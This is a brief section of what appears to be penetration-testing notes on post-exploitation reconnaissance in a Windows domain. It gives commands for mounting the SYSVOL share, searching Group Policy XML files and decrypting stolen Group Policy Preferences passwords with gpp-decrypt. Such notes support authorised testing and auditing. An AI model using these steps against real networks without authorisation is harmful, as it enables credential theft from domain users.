## On the client

> Approaches to gather information on the client.

### Domain context

> If the client is in a domain, Group Policies are applied and may contain information (historic data may remain on the `sysvol` share)

- Mount the share and check the files (has to be done on a shell not meterpreter!):

```cmd
# Mount
net use X: \\%LOGONSERVER%\SysVol  # LOGONSERVER is a domain controller

# Switch the volume
X:

# enter the GPO folder
cd domain.local\Policies
dir

# Search for xml files (may contain interesting things)
dir /s *.xml
```

Decrypt passwords contained in the GPO files on your kali machine:

```bash
gpp-decrypt <yourStolenEncryptedPasswordHere>
```
